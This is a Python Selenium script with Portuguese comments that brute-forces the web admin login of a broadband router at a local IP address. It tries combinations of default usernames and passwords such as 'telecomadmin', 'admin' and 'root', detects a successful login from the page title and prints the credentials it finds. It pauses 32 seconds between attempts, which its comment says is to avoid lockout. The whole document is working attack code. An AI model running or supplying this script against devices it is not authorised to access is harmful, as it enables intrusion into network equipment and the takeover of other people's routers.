from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep



user = ['user',
'telecomadmin',
'admin',
'root',
'Admin',
'User',
'Administrator' ]

password = ['admin',
'telecomadmin',
'user',
'123456789',
'root',
'Admin',
'User']

browser = webdriver.Chrome()

browser.get("http://192.168.2.1/admin/login.asp")

for i in range(user.__len__()):
    for j in range(password.__len__()):
        #Campo Usuário
        browser.find_element( By.XPATH, '/html/body/blockquote[1]/form/center/table/tbody/tr/td/table/tbody/tr[2]/td[3]/font/input').send_keys(user.__getitem__(i))
        #Campo Senha
        browser.find_element( By.XPATH, '/html/body/blockquote[1]/form/center/table/tbody/tr/td/table/tbody/tr[3]/td[3]/font/input').send_keys(password.__getitem__(j))
        #Enviar credenciais
        browser.find_element( By.XPATH, '/html/body/blockquote[1]/form/center/table/tbody/tr/td/table/tbody/tr[4]/td[3]/input').click()
        sleep(32)
        #Condição usuário inválido
        try:
            print(browser.title)
            condicao_one=browser.find_element( By.XPATH, '/html/body/blockquote/form/table/tbody/tr[1]/td/h4').is_displayed()
        except:
            condicao_one= False
            print("An exception occurred")
        
        if(condicao_one):
            print("\nUsuário ou senha inválidos")
            browser.back() # Volta para página de Login

            #Limpar os campos
            browser.find_element( By.XPATH, '/html/body/blockquote[1]/form/center/table/tbody/tr/td/table/tbody/tr[2]/td[3]/font/input').clear()
            browser.find_element( By.XPATH, '/html/body/blockquote[1]/form/center/table/tbody/tr/td/table/tbody/tr[3]/td[3]/font/input').clear()
        
        elif(browser.title == "BroadBand Device Webserver"):
            #//*[@id="header"]/div[1]/table[3]/tbody/tr/td
            print("\nCredenciais encontradas | Usuário: "+user.__getitem__(i)+" Senha: "+password.__getitem__(j))
            #logout
            browser.find_element( By.XPATH, '//*[@id="header"]/div[1]/table[1]/tbody/tr/td/form/input[1]').click()           
            #Confirmar
            browser.find_element( By.XPATH, '/html/body/blockquote/form/input').click()

        else :
            print("\nErro inesperado")
            exit()

        sleep(32) # Aguarda para evitar bloqueio de tentativas consecutivas.

browser.quit()